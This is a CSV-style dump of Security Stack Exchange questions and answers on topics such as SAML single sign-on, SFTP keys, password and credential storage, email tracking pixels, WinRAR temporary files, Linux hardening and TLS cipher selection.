"How is SAML solving the cross domain single sign-on problem?","24830","","<p>Let's say I have two websites that live on separate domains, and their service providers both talk to the same identity provider on a third domain. I log into the first website and authenticate, and now I decide to visit the second website. The second website comunicates with the identity provider so I don't need to log in again to access my account. How is this achieved using SAML? Is it possible to use cookies in this case? </p>
","<p>It actually can be a cookie, because it needn't be associated with the service provider at all, only the identity provider.   All either of the two service providers are going to do is make the authentication request to the identity provider, so the process for an unauthenticated user is going to be the same for sp.example1.com as it is for sp.example2.com.   </p>

<p>However, when the first request is made from sp.example1.com and the user is redirected to sso.example3.com, the user will login to sso.example3.com and can then set a cookie for sso.example3.com.    </p>

<p>Then, when the user visits sp.example2.com, it too will redirect the unauthenticated user to sso.example3.com, but this time, the browser will have a cookie to send along with the request from the last time the user visited sso.example3.com, even though that visit was initiated by a different service provider.   </p>

<p>Thus, the cookie from sso.example3.com can identify the user as already authenticated, and the identity provider can continue the process of issuing an assertion for the user to sp.example2.com without requiring the user to complete the login workflow again.  </p>
","38806"
"How does SFTP function without a manually generated public/private key pair","24821","","<p>I am learning about SSH and how to use it to secure file transfers and commands between a windows machine and a Linux server.  Everything that I have read so far indicates that I need to use an SFTP client (like WinSCP) to connect to my server and transfer files.  Gettin  gin a little deeper, the docs for WinSCP never tell me to set up a public or private key pair on my client and server.  I thought that the public and private keys were a fundamental element of how SSH worked.  How is SFTP (which I have read is based on SSH) able to function without a public and private key pair (or is it defaulting to an insecure mode like FTP in the situation?) </p>

<p>Originally, I thought that I needed to create these pairs for each individual that wanted to connect to the server and manually copy the public key file to the clients machine.</p>

<p>EDIT =============================</p>

<p>I did not understand that there are two sets of public/private keys in use, one that is created by the server and one that could possibly be created by the client.  Initially, I though that they were the same public/private key pair.</p>
","<p><strong>Short answer:</strong> there is necessarily a public/private key pair on the server. There <em>may</em> be a public/private key pair on the client, but the server may elect to authenticate clients with passwords instead,</p>

<hr />

<p><a href=""http://en.wikipedia.org/wiki/Secure_Shell"">SSH</a> is a generic tunnel mechanism, in which some ""application data"" is transferred. One such application is the ""remote shell"" which is used to obtain an open ""terminal"" on a server, in which terminal applications can be run. Another, distinct application is the file transfer protocol known as SFTP. From the SSH point of view, which application is used is irrelevant. This means that any authentication concept applies equally to SSH (the ""remote shell"" part) and SFTP.</p>

<p>The server MUST have a public/private key pair. That key is used for the tunnel part, so a server will use the same key pair for all applicative protocols. Most Unix-like operating systems (e.g. Linux) create a SSH key pair when first installed, and will use it thereafter. This means that you don't have to ""create a key"" when you configure your SSH server to also be used as SFTP: the server already has a key.</p>

<p>A client may have a public/private key pair if it wishes to be authenticated based on that key; this is all about <em>client authentication</em>, i.e. about how the server will make sure that it is talking to the right client. Password-based authentication and key-based authentication are the two most common methods (some servers are configured to require <em>both</em>). By definition, only the key-based authentication requires that the client stores and uses a key pair of its own.</p>
","55949"
"Is there any reason to not show users incorrectly entered passwords after a successful login?","24809","","<p>Our client has come up with the requirement that in case the username in question has had multiple failed login attempts, the incorrectly entered password(s) must be shown once a successful login is performed. Correctly entered information, including previous passwords, <strong>will not be shown</strong> in any case.</p>

<p>Our lead dev has told us it is technically possible by not hashing incorrect entries, but she is <em>extremely</em> uncomfortable with the feature and thus it has been put on hold while we brainstorm it out.</p>

<p>The website in question is a broad mapping/GIS application that does not feature any monetary transactions whatsoever. Other login/authentication options include Google/LinkedIn/Twitter/facebook, so obviously no passwords to be stored there and handling that is primarily a UX issue.</p>

<p>What security vulnerabilities come with implementing such a feature? Our client is not entirely without technical knowledge so a general explanation is enough.</p>

<p>My apologies if the question is too broad or the answer very obvious.</p>
","<p>The primary issue is that incorrect passwords have to be stored in a way that allows them to be later displayed to users.  Which, as your dev pointed out, means they can't be cryptographically hashed first.  The result is that you store them either as plaintext (bad) or encrypted (better but not normally recommended).</p>

<p>The biggest risk is if this database of invalid passwords becomes accessible to attackers.  Either they compromise the server, perform SQL injection, or retrieve it in some other way.  Rather than cracking the primary passwords, which hopefully are strongly hashed and therefore tougher targets, they could decide to compromise accounts using the information in the invalid password history.  Either they access the plaintext passwords easily, or they attempt to find the encryption key that allows them to decrypt back to plaintext passwords.</p>

<p>A common source of login failures is minor typos during the password entry process.  So my password is Muffins16 but I type in mUFFINS16 because my caps lock is on.  Or Muffins166 because I hit the same key twice.  Or Muffina16 because my finger hit the wrong key.  As you can see these variations are close enough to the original that attackers can probably determine the valid password from invalid passwords by trying a few minor alterations or comparing wrong passwords to likely dictionary words or names.</p>

<p>This problem is exacerbated because most people use password choices <a href=""http://www.passwordresearch.com/stats/statistic397.html"">similar to these formats</a> and not random strings.  It is harder for an attacker to identify the typo if your invalid password is V8Az$p4/fA, although still much easier to try variations of that then guessing it without any info.</p>

<p>Another risk is that users may not remember which of their passwords they used on this site so they try their common ones.  Now this site is suddently a bigger target because an attacker might be able to not only compromise a user's account there but also on other sites with the handy list of 'invalid' passwords.</p>

<p>You can mitigate some of these risks by wiping storage of invalid passwords immediately after display following a valid login.  That should limit the window of opportunity for an attacker to access and benefit from the data.</p>

<p>The question you should probably ask your client is how they predict users will benefit from seeing their invalid passwords.  Is it so users can identify how they mistyped their password?  Typos aren't intentional so it's not likely that showing them their mistake will improve future login attempts.  So users can identify an attacker trying to guess their passwords?  Similar feedback can be provided by listing date, time, IP/geolocation or other info for invalid attempts without the attempted password.  So users know that they screwed up during password entry and don't blame the site's login system?  This seems like the only one with merit and I'm not sure it provides enough value to justify the risk.</p>

<p>My guess is that once you better understand what they're trying to accomplish with this feature you can probably suggest more secure alternatives.</p>
","136386"
"How to safely store sensitive data like a social security number?","24769","","<p>I am looking for a way to safely store personal information with low entropy safely.</p>

<p>I have the following requirements for the data:</p>

<ul>
<li>Must be able to search (i.e. to look up an existing piece of data) but not view</li>
<li>Other systems must be able to recover the real value</li>
<li>The system must be reasonably well performant (options in seconds not hours)</li>
</ul>

<p>I think a system of encrypting the data using a public key is my best option. I can keep the private key offline so the individual value cannot be directly recovered. However I think that an attacker could use the encryption process as an oracle and recover the data due to its low entropy.</p>

<p>Any ideas on how to improve the security of this system? Not collecting this data is not an option. There will be additional layers around this data (access control, logging, physical security, etc) so I am just focused on this part of the system.</p>
","<p>What you're looking for is deterministic encryption: that the same value encrypted twice gives the same output.  Given deterministic encryption with a key K, an attacker would need the key to determine which SSN maps to which encrypted value.  You can still perform searches on the deterministically encrypted data, but only equivalency comparisons (==, !=).</p>

<p>Examples of deterministic crypto that would work:</p>

<ul>
<li>Block ciphers in ECB mode, if the data is &lt;1 block long</li>
<li>Block ciphers in CBC mode, with a static IV.</li>
<li>Block ciphers in CBC mode with an IV derived from the plaintext.  (Note that you don't want to store the IV then, so decryption without the plaintext is thus impossible, so this is a search-only option.)</li>
</ul>

<p>What won't work:</p>

<ul>
<li>CTR Mode with a static IV (an attacker can then use multiple ciphertexts to recover the keystream &amp; plaintexts)</li>
<li>CBC Mode with a random IV (can't search)</li>
<li>Any stream cipher (same as CTR mode)</li>
</ul>

<p>Note that, in all cases, you are giving up ciphertext indistinguishability, but that's a core requirement of being able to search on the ciphertexts. </p>

<p>You do need a mechanism to share the key with other systems that need access to the plaintext, but an attacker who gains access to a database backup, SQL injection, or any other attack that gives access only to the database won't be able to discern the plaintexts.</p>

<p>PKI is not useful here, as you point out, as having the public key allows to enumerate the values and recover them, if you're using a deterministic PKI cryptosystem (plain, unpadded, RSA, for example).  Using a non-deterministic PKI (padded RSA) will not allow you to search on the ciphertexts.</p>

<p>I would review whether you really need to encrypt small, easily brute forced plaintexts.  What is your threat model?  Can you protect against these threats in other ways?</p>
","61004"
"How to encrypt database connection credentials on a web server?","24748","","<p>OWASP advise against storing DB credentials in plain text:</p>

<p><a href=""https://www.owasp.org/index.php/Password_in_Configuration_File"">https://www.owasp.org/index.php/Password_in_Configuration_File</a></p>

<p>However, they don't provide suggestions of how to encrypt the DB access credentials, where to store keys, how to manage access to keys, etc.</p>

<p>Has anyone any real-world experience of implementing such a solution who can suggest an architecture on a LAMP stack (ubuntu 10, PHP 5.3)?</p>

<p>PS - I'm not looking for answers along the lines of ""don't bother - if someone gains root access it's too late"", etc.</p>
","<p>The other answers here are all correct in a couple key aspects. The file containing your connection string should not be kept in a world readable location, and as you note, you can't stop someone from getting at the key if they've compromised your sever. Even so, there are other reasons to encrypt the key (or the file). Part of the reason OWASP reccomends against storing in plain text are to prevent accidental disclosure of credentials to those who don't need them. </p>

<p>While many make the point that encrypting the connection string on the running system provides little actual value (security by obscurity) this is true primarily in the context of the live system. Assuming a traditional LAMP configuration, file based permissions would prevent read from any user other than the script user that the php/apache process is running under. Having the file outside of the root locatin provides slightly more potential security (in case of misconfigured MIME handlers or .htaccess) but isn't strictly necessary. </p>

<p>The greatest value in segregating connection settings is that authentication details and data no longer needs to be handed out to developers/testers or other individuals that may have a real need to connect to the server. By keeping the connection details out of source control, and out of general distribution, you reduce the possibility of loss or leakage.</p>

<p>A second benefit is the distribution and backup of the source. Certainly a best practice would be to only transfer files containing sensitive connection and account information encrypted themselves, but for many reasons, this isn't always practical. Due to this if encryption is in use, separating the key from the connectionstring and separating the connectionstring from the source is an essential action. Doing this has separated the duties and protection of the encryption keys (or configuration files) becomes a system administrator function, rather than a developer function.</p>

<p>That out of the way, in Apache/php you have a number of options.</p>

<p>1.) Don't put the connectionstring in php code at all. You can put these values in your <code>httpd.conf</code> or virtual hosts file. Connection then requires no parameters when using <code>mysql_connect()</code> ... more detailed use is available here: <a href=""http://www.php.net/manual/en/class.mysqli.php"">http://www.php.net/manual/en/class.mysqli.php</a></p>

<p>2.) Include the configfile.php configuration file as normal, but move the connection file out of webroot if you can, and encrypt the file itself. OS decrpyption can be set up by the SA for the process that will access the file. Alternately use If you can't move the file out of the webroot (shared hosting) secure the file with <code>.htaccess</code></p>

<pre><code>&lt;files configfile&gt; 
     order allow,deny 
     deny from all 
&lt;/files&gt; 
</code></pre>

<p>For Microsoft IIS with ASP.NET, the connection string is stored in the application.config or web.config file and the encryption used can either be a static machine key, stored in either of these files, or a key generated by IIS itself - which is not stored in an accessible location. Specifics are available on MSDN, which I won't litter this answer with since your question was specific to LAMP.</p>

<p>I should also note, that when possible, my preference is to avoid the issue altogether by using integrated authentication. Mapping the os user to a db user pulls the protection requirements out of this question's context almost altogether. </p>
","22858"
"Is it possible to use S/MIME in the web client of Gmail?","24629","","<p>I could not find any options in the web interface of Gmail.</p>

<p>All I could find was a Firefox plugin to use S/MIME with Gmail, but it seems to be outdated.</p>
","<p>There is Penango - <a href=""https://www.penango.com/products"">https://www.penango.com/products</a> - which seems to have a free edition for GMail. I looked into it a while back, since as you say, there isn't anything all that up-to-date, but haven't tried it (ended up going with S/MIME in Outlook checking my GMail account).</p>
","30753"
"Can headphones transmit malware?","24622","","<p>Can headphones transmit malware? My friend borrowed my headphones (a pair of Apple EarPods) and plugged them into his Android mobile phone for a few minutes in order to listen to a voice message. Would it be dangerous if I plug it into my phone afterwards (since I wonder whether the headphone can store malware which would eventually go into my phone)? Would it be possible to ""factory reset"" my headphone (just like doing so in iOS)?</p>
","<p>I doubt there is a way to store any information (thus transfer information) on regular headphones. Some more advanced models (such as noise canceling) have some processing ability and firmware, but I don't see it as a viable attack vector.</p>
","127115"
"How does someone with HubSpot Sidekick knows when I opened their sent email?","24597","","<p><a href=""http://www.getsidekick.com/"">This app</a> claims to know when recipients opened the emails that were sent to them. Tracking clicked URLs is fairly straightforward. What I don't understand is how a 3rd party can possibly know when I open their email?</p>

<p>Does web-based email clients automatically provide reading-proof to all emails? Because I remember Outlook was asking me whether I wanted to actually send proof of reading or not. If so, how do I disable it?</p>
","<p>They track opens the same way every other email sending/analytics company does it: by inserting a tracking pixel within the HTML of the email. If your email client blocks image loading by default, then you won't be tracked. If you load the images, or your client automatically downloads the images (iPhone email client) then you're being tracked.</p>

<p>You can see more information about how this works precisely here: <a href=""http://en.wikipedia.org/wiki/Web_bug"">http://en.wikipedia.org/wiki/Web_bug</a></p>
","70791"
"3 or 4 characters long username from security point of view","24596","","<p>I have on my site the ability for the user to choose his/her username that is 4-20 characters long.</p>

<p>But some users could have names like ""Amy"" ""Eva"", ""Ian"" etc.</p>

<p>Should I stick with 4 letters or go to 3 letters?</p>

<p>Are there any disadvantages from security point of view?</p>

<p>I am using trim and xss filt. on every user input and the words like admin etc. are restricted in my callback method.</p>

<p>Is it safe to go to 3 from 4 letters? </p>
","<p>There's no difference from a security perspective - the authentication strength should come from the password, not the username.</p>

<p>However, I wouldn't put a minimum of 3 characters on a username. In China alone, there are over 700,000 people with the given name Na or Li, and there are plenty more one-character and two-character names. Add that to the fact that names <em>don't even need to be made of ASCII letters</em>, and you're running into problems. Granted, you can probably enforce ASCII for your purposes, since most names consisting of non-Roman characters can be represented with the standard A-Z alphabet in some way.</p>

<p>I highly recommend you read <a href=""http://www.kalzumeus.com/2010/06/17/falsehoods-programmers-believe-about-names/"">Falsehoods Programmers Believe About Names</a> and absorb the crazy facts within it. You can <em>reasonably safely</em> ignore some of the more esoteric issues (e.g. Klingon names) but be aware that there are people whose names do not fit in with any single standard model you can come up with.</p>
","24950"
"Does WinRAR leave traces of temporarily extracted files?","24564","","<p>If I have an encrypted RAR file which will only open using a password, and I opened a file directly from within WinRAR by double clicking the file inside WinRAR, I assume that WinRAR will create a temporary version somewhere in the drive (temp folder?) before opening it using the default application assigned by the user in the system. </p>

<p>Does WinRAR make sure to delete all traces of the file once the archive is closed? or will it keep the temp file somewhere in the file system?</p>
","<p>Very good question. <strong>Yes</strong>, by default, WinRAR leaves traces of temporarily extracted files.</p>

<p>WinRAR does indeed create temporary files when opening them directly from the archive. It also performs a normal deletion once WinRAR is closed. However, deleted files do physically stay on the disk after you delete them. Normal delete operations only delete the file from the filesystem index.</p>

<p>Think of it like trying to remove a page from a book by striking its title from the index page - the page stays in the book.</p>

<p>WinRAR has a nice feature that securely wipes (removes the index, <em>and</em> the page itself from the book) temporarily extracted files after WinRAR is closed. By default, this feature is turned off. You can turn it on from the security settings window.</p>

<p><img src=""https://i.stack.imgur.com/cqYSw.png"" alt=""winrar-secure-wipe""></p>

<p>By default, it's set to 'Never', you don't want that. The option 'Always' securely wipes all temporarily extracted files, while the option 'Encrypted only' wipes temporarily extracted files only if they belong to an encrypted archive.</p>

<p><strong>Important notes:</strong> WinRAR will also create temporary files when extracting files by dragging them to the destination. However, using the ""Extract here"" option doesn't create temporary files.</p>

<p>As mentioned below, it's also important to make sure that you don't close WinRAR before closing your file. I've just tested this behavior a Microsoft Word document and a PDF file. The .docx file persisted in the temp folder, while the .pdf file was wiped as soon as WinRAR was closed. So make sure you understand that this behavior isn't very reliable if you close WinRAR or if it crashes.</p>
","57751"
"Identify SSL version and cipher suite","24487","","<p>We have a Java application running on a Linux server and we are transmitting some files using a third party Java library which uses HTTPS internally to connect to external servers. These are legacy libraries and we have only .jar files. </p>

<p>How can I identify which SSL/TLS version is being used by this library? Is there a way to monitor the TCP traffic on my Linux machine to track SSL headers?</p>
","<p>One of the way that I use to capture the network traffic from the java application using <a href=""http://www.wireshark.org/download.html"" rel=""noreferrer"">Wireshark</a>. Refer the <a href=""http://www.wireshark.org/docs/wsug_html_chunked/ChapterCapture.html"" rel=""noreferrer"">documentation</a> to capture the traffic. Once the traffic is captured. Click Analyze -> Decode As -> Transport,select the port and the select SSL, apply and the save the settings. The captured traffic will be shown as SSL. Look for the response of the  ""client hello"" message in the captured traffic. This is where SSL/TLS handshake is done. </p>

<p>Refer the below image:</p>

<p><img src=""https://i.stack.imgur.com/4GDDO.jpg"" alt=""enter image description here""></p>
","52157"
"Hardening Linux desktop machine against people from my household","24423","","<p>I am looking to make a clean install of a Debian system on my home desktop. To clarify, I am switching from Windows and wish to use it as my day-to-day home OS - I'm not going to be running any servers or anything like that.</p>

<p>I also have reason to believe that some members of my household (who have physical access to my machine) would try to gain access to it, and look through my data or possibly even install a keylogger.</p>

<p>For the purpose of this question, please ignore the social aspects, except for the fact that I cannot act openly confrontational, so e.g. locking my room to prevent anyone accessing my PC is not an option.</p>

<p>The people I want to protect against are technologically literate; they know their way around linux even if they may lack much experience with it, and if something can be found with some googling and takes maybe an hour or two of messing around then it's most likely going to get attempted. That said, I am pretty certain that acquiring specialist equipment is not something they would bother with, which means that I don't have to worry about most hardware attacks, e.g. a keyboard keylogger or bug on my mobo / RAM sniffer / whatever.</p>

<p>One other thing is that I have a Windows 7 system to which they have admin access (so it can be considered compromised). This is one of the reasons I am switching to Linux; however, I'd like to keep a dual-boot system rather than removing Windows outright. I am aware that this would allow an attacker to outright nuke my Linux partition, and that is a risk I'm willing to take.</p>

<p><strong>I am not concerned with securing my Windows system. I am aware it's compromised and don't really care what happens to it.</strong> As I mentioned, other people have accounts on my Windows system and occasionally use it (for legitimate reasons!). I am certainly looking to secure my Linux installation, but preventing access to Windows has no point <em>unless</em> it contributes to the security of the Linux part of my machine. In fact, I'd rather avoid limiting access to Windows if possible because I don't want to appear paranoid or create conflict in the household.</p>

<p>Full-disk encryption will prevent anyone from actually accessing my data from outside my Linux installation itself, which should then take care of both the Windows system and even make booting from a USB drive mostly useless (I am quite certain that the people in question do not have the resources or the motivation to decrypt a well-encrypted drive). I will also need to password-protect the single-user mode, of course.</p>

<p><strong>What other things would I need to do to secure my system?</strong> I am handy with the command line and willing to get my hands dirty, but I have limited Linux experience and fragmentary knowledge of computer security. The choice of Debian is largely arbitrary and I would have no problem trying out a different distro if it would be better in my case. If there's anything I've missed, or if you have tips on things I mentioned (e.g. best practices for disk encryption?), then I would be glad to hear them.</p>

<p><em>I do not believe this question is a duplicate because all of the other questions I found on securing Linux on this site concern themselves with remote attackers and protection against viruses and exploits. They certainly have good answers but that is not the kind of information I am looking for here.</em><br>
<em>Another question has been brought to my attention when my post was flagged as duplicate. However, that one asks in general whether their machine is secure when others have physical access to it; the answers to it generally boil down to ""Physical access = game over"" and provide some tips to mitigate various attacks (including things such as rearview mirrors on your monitor). Many of those tips are not applicable here, since I am aware that unlimited physical access means the machine isn't mine anymore in theory, and hence I provide some limitations to the attackers in my threat model which fit my personal scenario.</em></p>
","<ol>
<li><p>Use a strong and difficult password for the root user. Secondly, always login and work from another user with no administrative rights (and also a strong password).</p></li>
<li><p>Enable the BIOS password option. Every time you power on your computer, the BIOS itself will ask you for a password before even booting on. It will also prevent everyone from applying changes to the BIOS setup.</p></li>
<li><p>Encrypt every partition of your hard drive (check cryptsetup for Debian - if it can't encrypt you Windows partition, too, use TrueCrypt (from Windows for your Windows))</p></li>
<li><p>Watch out for external hardware devices connected on your PC (like USB sticks or hubs) that you haven't used before. Someone might have plugged in a keylogger or something.</p></li>
<li><p>Always lock or power off the machine when you are away.</p></li>
<li><p>Software hardening:</p>

<p>Install <a href=""http://gufw.org/"" rel=""nofollow noreferrer"">gufw</a> (GUI for the iptables firewall which is pre-installed) and block incoming traffic. Also install <a href=""http://rkhunter.sourceforge.net/"" rel=""nofollow noreferrer"">rkhunter</a> and check your system for known rootkits and other threats from time to time.</p></li>
</ol>

<p>That's all I can think of right now. If you have any questions feel free to comment below.</p>
","127099"
"Is using ""SHA-256 with RSA-2048 Encryption"" a secure certificate hashing algorithm?","24415","","<p>Is using ""SHA-256 with RSA-2048 Encryption"" a secure certificate hashing algorithm? I don't think it is. Two examples: <a href=""https://www.nsa.gov/psp/applyonline/EMPLOYEE/HRMS/c/HRS_HRAM.HRS_CE.GBL?Page=HRS_%252520CE_HM_PRE&amp;Action=A&amp;Siteld=l"" rel=""nofollow"">nsa.gov [careers site]</a> <a href=""http://give.wfp.org"" rel=""nofollow"">give.wfp.org</a></p>
","<p>The technical answer is actually ""no, because <em>SHA-256 with RSA-2048 Encryption</em> is not a <em>certificate <strong>hashing</strong> algorithm</em>. However, SHA-256 is a perfectly good secure hashing algorithm and quite suitable for use on certificates, and 2048-bit RSA is a good <strong><em>signing</em></strong> algorithm (<em>signing</em> is not the same as <em>encrypting</em>). Using 2048-bit RSA with SHA-256 is a secure signing scheme for a certificate. Why would you think otherwise?</p>

<p>SHA-256 is a member of the SHA2 family of secure hash functions, and there are not currently any cryptographic weaknesses publicly known for SHA2. It might be less secure than SHA-512, but 256 bits is already completely impractical to brute force (we're talking about timeframes of hundreds of years even with the resources of a nation-state and assuming Moore's Law continues on track, or billions of years for currently-established technology). The only viable attacks would require finding a weakness in the hash algorithm itself, and it's not necessarily the case that SHA-512 would be more resistant to such an attack than SHA-256. There is a new <a href=""https://en.wikipedia.org/wiki/SHA-3"" rel=""noreferrer"">SHA3</a> standard, but it's not yet widely implemented so your browser probably wouldn't be able to verify the certificate's signature at all if they used SHA3 in the signing algorithm.</p>

<p>RSA is a current standard for public-key cryptography, and a properly-generated 2048-bit RSA key is strong enough to resist factoring for decades. You could use a 4096-bit key if you want to (it'll take a lot longer to generate, and slightly longer to use, but once the certificate's signature is verified that doesn't matter anymore), and that would take even longer to break. However, neither certificate is valid for more than two years anyhow. If you want a signature you can trust for 30 years or more, you might want to use something stronger than 2048-bit RSA, but for now that's fine.</p>
","122162"
"Javascript and jQuery not secure over https","24368","","<p>I am building an ASP.NET MVC 3 app which will run in Azure. Everything was working well, until I switched to https. Now most of my jQuery plugins and some other javascript are not secure. </p>

<p>I'm using the Datatables library as well as jsTree, watermaks and breadcrumbs. Most of this script is to make our site look appealing. </p>

<p>Is there a way to make this secure? Or is it time to move a very lean javascript site?</p>

<p>Thank you for the help!</p>
","<p>I serve my entire site over https, jquery included.</p>

<p>The trick is to use a CDN for jQuery that supports https, or deploy the code to your own site and include it from your domain. In code, for example:</p>

<pre><code>&lt;script type=""text/javascript"" 
        src=""https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js""&gt;&lt;/script&gt;
</code></pre>

<p>Works fine and will show up as a secure element.</p>

<p>Now, is that <em>actually</em> secure? Well, I generally trust Google APIs as a CDN and the content I have is not that crucial - however, if I wished to ensure I had total control of the jQuery deployment, I could just host it myself:</p>

<pre><code>&lt;script type=""text/javascript"" 
        src=""https://mysite.com/static/js/jquery.min.js""&gt;&lt;/script&gt;
</code></pre>

<p>Both will work fine. Bottom line: you do not <em>have</em> to deploy jQuery from the CDN, however, if you want to, at least one of them supports https (others may, I looked no further).</p>

<hr>

<p>An aside to consider - one of the reasons for accessing code from the CDN was to always have the latest version of the jQuery code. Deploying it yourself, you do lose this immediacy - you also gain a slight buffer against breaking updates, although hopefully that shouldn't be an issue.</p>
","11279"
"How secure is Chrome storing a password?","24352","","<p>Whenever I enter a login into a new site, Chrome asks me if it should store the login details. I used to believe this was fairly secure. If someone found my computer unlocked, they could get past the login screen for some website using the stored details, but if asked for the password again like during checkout, or if they wanted to login to the service from another device, they would be out of luck. </p>

<p>At least, that's what I used to think when I believed the browser did not store the password itself, but a hash or encryption of the password. I have noticed that the browser fills the username and password fields, and the password field indicates the number of characters in the password. </p>

<p>I'm one of those people who when asked to change their password just keeps the same password, but changes a number at the end. I know this is bad, but with how often I am asked to change passwords, I really could not remember the number of passwords expected of me. This results in a lot of passwords that are the same, but sometimes I forget what the end number needs to be for a particular login. </p>

<p>I could not remember the ending number for a certain login, so I went to a website where the password was stored. I deleted the last couple of characters and tried different numbers and viola, knew what was the right ending number.</p>

<p>It seems to me that this is a fundamental security flaw. If I can check the last character of my password without checking any others, then the amount of tries it takes to crack the password grows linearly with the number of characters not exponentially. It seems like a short stride from there to say that if someone came to my computer when it was unlocked, a simple script could extract all of the stored passwords for all of the major websites which I have passwords stored for. </p>

<p>Is this not the case? Is there some other layer of security that would prevent this?</p>
","<p>Chrome not only stores your password text, it will show it to you. Under settings -> advanced -> manage passwords  you can find all your passwords for all your sites. Click show on any of them and it will appear in the clear.</p>

<p>Hashed passwords work for the site authenticating you. They are not an option for password managers. Many will encrypt the data locally, but the key will also be stored locally unless you have a master password setup.</p>

<p>Personally, I use the chrome password manager and I find it convenient. I also, however, have full disk encryption and lock my screen diligently. Which makes the risk reasonable imho.</p>

<p>You seem to be inconsistent (many are) by both selecting memorable passwords and using a password manager. And I may venture to guess you may even repeat the password or at least the theme across many sites. This gives you the worst of both worlds. You get the risks of password manager without the benefits.</p>

<p>With a password manager you trust, you can give each site a unique random password not memorable at all and gain a lot of protection from many very real attack vectors. In exchange for a single point of failure of your password manager. Even with a less than perfect password manager this isn't an unreasonable trade off. With a good password manager this is becoming the consensus best practice.</p>

<p>Edit to add: please read <a href=""https://security.stackexchange.com/questions/170481/how-secure-is-a-browser-storing-a-password/170485#170485"">Henno Brandsma</a>  answer explaining how login password and OS support can be used to encrypt passwords, this gives a reasonable level of protection to your passwords when the computer is off/locked (full disk encryption is better) and won't help much if you leave your computer unlocked. Even if the browser requires password to show plain text debug tools will still let you see already filled passwords as @Darren_H comments. The previous recommendation still stands use random unique passwords and a password manager. </p>
","170482"
"How to safely view a malicious PDF?","24337","","<p>I have a PDF with important information that may contain malware. What would be the best way to view it?</p>
","<p>Document-based exploits are directed not at the document itself, but rather at some vulnerability in the viewer. If you view the document in a program that isn't vulnerable (or in a configuration that inhibits the vulnerability), then you won't be exploited.</p>

<p>The real issue is knowing whether or not your viewer is vulnerable, which usually means knowing specifically what the exploit is. But there are alternate PDF viewers such as foxit or even Google chrome's built-in viewer that do not necessarily have the same vulnerabilities as Adobe's official viewer. This is not necessarily true for <em>all</em> vulnerabilities, so it's important to understand what you're getting in to ahead of time.</p>

<p><strong>EDIT</strong><br>
If you find yourself frequently dealing with potentially malicious materials, it would be very wise to set up a hardened virtual environment. I'd recommend booting into a Linux system and running your target OS (usually Windows) in Virtualbox or a similar environment. Save a snapshot of the virtual OS, and then revert to that snapshot after you're done interacting with the malicious content. Also, it's not a bad idea to run the host Linux environment from a read-only installation (i.e. Live-CD).</p>
","18879"
"If you could have only one book on web security, what would it be?","24246","","<p>If you could have only one book on web security, what would it be?</p>
","<p>Many people do recommend this one book: <a href=""http://rads.stackoverflow.com/amzn/click/0470170778"">The Web Application Hacker's Handbook: Discovering and Exploiting Security Flaws</a>, which I also find very useful. But you should not rely upon only on one book. This book was released back in 2007 year, now there have appeared many new technologies. So, besides books you should follow standards, RFC's and other documents. I know other really good and fresh book. I have only hard copy in German, not aware if it is available in English - <a href=""http://rads.stackoverflow.com/amzn/click/3836211947"">Sichere Webanwendugen</a>.</p>
","420"
"Can someone explain what exactly is accomplished by generation of DH parameters?","24222","","<p>I'm setting up a node.js server: </p>

<pre><code>https.createServer({
    ...
    ciphers: 'ECDHE-RSA-AES128-SHA256:AES128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH',
    honorCipherOrder: true
}, app).listen(443);
</code></pre>

<p>This is a able to achieve a SSLLabs A rating, which is good. Now, it appears that all of the negotiations in the handshake simulation are performed using <code>TLS_RSA_WITH_RC4_128_SHA</code>.</p>

<p>RC4 is resilient against BEAST. If we are vulnerable to BEAST we cannot get an A rating. </p>

<p>I would like to support PFS (forward secrecy) if supported by the client. </p>

<p>Based on my reading I ""must generate some randomness"" by generating Diffie-Hellman parameters and get that into my certs somehow, before the server will properly implement ECDHE for forward secrecy. I read somewhere that ECDHE is less CPU-intensive than DHE, so that is a plus. </p>

<p>Well, I have a lot of questions. But I will ask the first one: </p>

<p>Why must I <a href=""http://baudehlo.wordpress.com/2013/06/24/setting-up-perfect-forward-secrecy-for-nginx-or-stud/"" rel=""nofollow noreferrer"">generate ""some randomness""</a> to append to the certificates, what purpose does it serve, and what does the command actually do? <a href=""http://www.openssl.org/docs/apps/dhparam.html"" rel=""nofollow noreferrer"">The OpenSSL page on dhparam</a> doesn't tell me a lot about what it actually does.</p>

<p>I have seen <a href=""https://security.stackexchange.com/a/12053/9786"">this answer</a> and am looking for a more clear explanation (or at least references to relevant reading!).</p>

<p>According to <a href=""http://www.openssl.org/docs/apps/ciphers.html"" rel=""nofollow noreferrer"">OpenSSL Ciphers</a> it looks like ECDHE is a TLS 1.2 cipher. On <a href=""https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy"" rel=""nofollow noreferrer"">Qualys' PFS page</a> it says that ECDHE is supported by all major modern browsers, and yet I only see iOS6 in the results from my SSLLabs test connecting via TLS1.2. I guess I can take the ""handshake simulation"" section with a grain of salt.</p>

<p>Another question is why SSLLabs rates with an A if I leave the <code>HIGH</code> entry in the cipher list: This would have the server support a connection e.g. <code>TLS_RSA_WITH_AES_128_CBC_SHA</code> (the report indicates as much), which is vulnerable to BEAST! Perhaps because it never tested with a ""client"" that reports no RC4 support.</p>

<p>One more question: On the OpenSSL Ciphers page the list under TLS 1.2 cipher suites includes: </p>

<pre><code>TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256     ECDHE-RSA-AES128-SHA256
</code></pre>

<p>Does this indicate that if I do get it connecting with ECDHE that is now vulnerable to BEAST as well due to the use of CBC? E.g. I should switch this to do as Google does: ECDHE with RC4. But the Ciphers page does not include anything that looks like ECDHE-RSA-RC4-SHA. There is however a ECDHE-ECDSA-RC4-SHA. How is this different? Edit: <a href=""https://stackoverflow.com/a/10185909/340947"">this SO answer</a> mentions that ECDSA is something separate from RSA. I'd like to replicate what Google's doing with the ECDHE_RSA+RC4+SHA as that seems like the perfect blend of performance and security.</p>

<p>More notes (please tell me if I have misunderstood things, especially the statements disguised as questions): </p>

<p>BEAST resilience is controlled through the selection of the symmetric cipher (RC4 vs AES, etc). Modes of AES not using CBC are not supported by many clients? So we should just avoid AES altogether...? PFS is may be obtained through the use of Diffie-Hellman key exchange, and only the modes that include either <code>DHE</code> or <code>ECDHE</code> satisfy this. Only OpenSSL supports perfect forward secrecy. RC4 is faster than AES. RC4 is better than AES (because of BEAST)?</p>

